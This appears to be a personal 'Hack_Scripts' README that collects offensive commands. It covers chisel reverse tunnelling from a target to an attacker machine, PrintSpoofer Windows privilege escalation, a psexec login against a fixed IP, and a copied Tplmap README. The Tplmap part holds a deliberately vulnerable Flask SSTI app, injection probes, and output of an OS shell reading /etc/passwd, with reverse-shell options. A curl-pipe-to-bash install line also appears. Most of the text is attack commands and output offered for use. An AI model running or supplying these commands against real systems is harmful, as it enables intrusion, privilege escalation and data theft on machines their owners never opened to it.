# Hack_Scripts

The Scripts for Hacking and general ,
Includes python2  and Java
  - Java
  - Python
  - Php

# CHISEL

Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. Written in Go (golang). Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network.

See the latest release or download and install it now with curl https://i.jpillora.com/chisel! | bash

### Usage

$ chisel --help
  Usage: chisel [command] [--help]
  
  Version: X.Y.Z
  
  Commands:
  - server - runs chisel in server mode.
  - client - runs chisel in client mode.
    
  Read more:
  https://github.com/jpillora/chisel
    
`chisel server -p 9000 --reverse -v`   >> Run in Attacker Machine  
`chisel client <attacker ip:port{differnt port}> R:<attacker ip:port{different port1}>:<localhost:port{running port, need to be forwarded}>`   >> Run in Target Machine
 

# PrinterSpoofer

https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/  

Windows privilege escalation, To achive this check for **Privilages Information** by 
`whoami /priv'  

### PRIVILEGES INFORMATION

| Privilege Name             |   Description                            |   State     |  
|----------------------------|------------------------------------------|-------------|  
|SeAssignPrimaryTokenPrivilege| Replace a process level token            | Disabled   |
|SeIncreaseQuotaPrivilege     | Adjust memory quotas for a process       | Disabled   |
|SeAuditPrivilege             | Generate security audits                 | Disabled   |
|SeChangeNotifyPrivilege      | Bypass traverse checking                 | Enabled    |
|SeImpersonatePrivilege     |   Impersonate a client after authentication| Enabled|  
|SeCreateGlobalPrivilege      | Create global objects                    | Enabled    |
|SeIncreaseWorkingSetPrivilege| Increase a process working set           | Disabled   | 
  
***SeImpersonatePrivilege*** need to be **Enabled**  

### Command for escaltion
`PrinterSpoofer.exe -i -c cmd`

# PSEXEC

We can Loing to the windows machine, verify's the host/username present in the windows machine.

### Command: 
`python3 psexec.py <host name>/<user>:<password>@10.10.208.42 cmd.exe`

Tplmap
======

> This project is no longer maintained. I'm happy to merge new PRs as long they don't break the [test suite](https://github.com/epinna/tplmap/wiki/Run-the-test-suite).

Tplmap assists the exploitation of Code Injection and Server-Side Template Injection vulnerabilities with a number of sandbox escape techniques to get access to the underlying operating system.

The tool and its test suite are developed to research the SSTI vulnerability class and to be used as offensive security tool during web application penetration tests.

The sandbox break-out techniques came from James Kett's [Server-Side Template Injection: RCE For The Modern Web App][10], other public researches [\[1\]][1] [\[2\]][2], and original contributions to this tool [\[3\]][3] [\[4\]][4].

It can exploit several code context and blind injection scenarios. It also supports _eval()_-like code injections in Python, Ruby, PHP, Java and generic unsandboxed template engines.

Server-Side Template Injection
------------------------------

Assume that you are auditing a web site that generates dynamic pages using templates composed with user-provided values, such as this web application written in Python and [Flask][12] that uses [Jinja2][11] template engine in an unsafe way.

```python
from flask import Flask, request
from jinja2 import Environment

app = Flask(__name__)
Jinja2 = Environment()

@app.route("/page")
def page():

    name = request.values.get('name')
    
    # SSTI VULNERABILITY
    # The vulnerability is introduced concatenating the
    # user-provided `name` variable to the template string.
    output = Jinja2.from_string('Hello ' + name + '!').render()
    
    # Instead, the variable should be passed to the template context.
    # Jinja2.from_string('Hello {{name}}!').render(name = name)

    return output

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=80)
```

From a black box testing perspective, the page reflects the value similarly to a XSS vulnerability, but also computes basic operation at runtime disclosing its SSTI nature.

```
$ curl -g 'http://www.target.com/page?name=John'
Hello John!
$ curl -g 'http://www.target.com/page?name={{7*7}}'
Hello 49!
```

Exploitation
------------

Tplmap is able to detect and exploit SSTI in a range of template engines to get access to the underlying file system and operating system. Run it against the URL to test if the parameters are vulnerable.

```
$ ./tplmap.py -u 'http://www.target.com/page?name=John'
[+] Tplmap 0.5
    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Testing if GET parameter 'name' is injectable
[+] Smarty plugin is testing rendering with tag '{*}'
[+] Smarty plugin is testing blind injection
[+] Mako plugin is testing rendering with tag '${*}'
...
[+] Jinja2 plugin is testing rendering with tag '{{*}}'
[+] Jinja2 plugin has confirmed injection with tag '{{*}}'
[+] Tplmap identified the following injection point:

  GET parameter: name
  Engine: Jinja2
  Injection: {{*}}
  Context: text
  OS: linux
  Technique: render
  Capabilities:

   Shell command execution: ok
   Bind and reverse shell: ok
   File write: ok
   File read: ok
   Code evaluation: ok, python code

[+] Rerun tplmap providing one of the following options:

    --os-shell                Run shell on the target
    --os-cmd                  Execute shell commands
    --bind-shell PORT         Connect to a shell bind to a target port
    --reverse-shell HOST PORT Send a shell back to the attacker's port
    --upload LOCAL REMOTE     Upload files to the server
    --download REMOTE LOCAL   Download remote files
```

Use `--os-shell` option to launch a pseudo-terminal on the target.

```
$ ./tplmap.py --os-shell -u 'http://www.target.com/page?name=John'
[+] Tplmap 0.5
    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Run commands on the operating system.

linux $ whoami
www
linux $ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
```

Supported template engines
--------------------------

Tplmap supports over 15 template engines, unsandboxed template engines and generic _eval()_-like injections.

| Engine                 | Remote Command Execution |  Blind | Code evaluation | File read | File write |
|------------------------|---------------|-------------------|-----------------|-----------|------------|
| Mako                   | ✓ |  ✓                | Python          |  ✓        |  ✓         |
| Jinja2                 | ✓ |  ✓                | Python          |  ✓        |  ✓         |
| Python (code eval)     | ✓ |  ✓                | Python          |  ✓        |  ✓         |
| Tornado                | ✓ |  ✓                | Python          |  ✓        |  ✓         |
| Nunjucks               | ✓ |  ✓                | JavaScript      |  ✓        |  ✓         |
| Pug                    | ✓ |  ✓                | JavaScript      |  ✓        |  ✓         |
| doT                    | ✓ |  ✓                | JavaScript      |  ✓        |  ✓         |
| Marko                  | ✓ |  ✓                | JavaScript      |  ✓        |  ✓         |
| JavaScript (code eval) | ✓ |  ✓                | JavaScript      |  ✓        |  ✓         |
| Dust (<= dustjs-helpers@1.5.0) | ✓ |  ✓        | JavaScript      |  ✓        |  ✓         |
| EJS                    | ✓ |  ✓                | JavaScript      |  ✓        |  ✓         |
| Ruby (code eval)       | ✓ |  ✓                | Ruby            |  ✓        |  ✓         |
| Slim                   | ✓ |  ✓                | Ruby            |  ✓        |  ✓         |
| ERB                    | ✓ |  ✓                | Ruby            |  ✓        |  ✓         |
| Smarty (unsecured)     | ✓ |  ✓                | PHP             |  ✓        |  ✓         |
| PHP (code eval)        | ✓ |  ✓                | PHP             |  ✓        |  ✓         |
| Twig (<=1.19)          | ✓ |  ✓                | PHP             |  ✓        |  ✓         |
| Freemarker             | ✓ |  ✓                | Java            |  ✓        |  ✓         |
| Velocity               | ✓ |  ✓                | Java            |  ✓        |  ✓         |
| Twig (>1.19)           | × | ×                 | ×               | ×         | ×          |
| Smarty (secured)       | × | ×                 | ×               | ×         | ×          |
| Dust (> dustjs-helpers@1.5.0) | × | ×          | ×               | ×         | ×          |


Burp Suite Plugin
-----------------

[10]: http://blog.portswigger.net/2015/08/server-side-template-injection.html
[3]: https://github.com/epinna/tplmap/issues/9
[4]: http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine
[1]: https://artsploit.blogspot.co.uk/2016/08/pprce2.html
[11]: http://jinja.pocoo.org/
[12]: http://flask.pocoo.org/
[2]: https://opsecx.com/index.php/2016/07/03/server-side-template-injection-in-tornado/
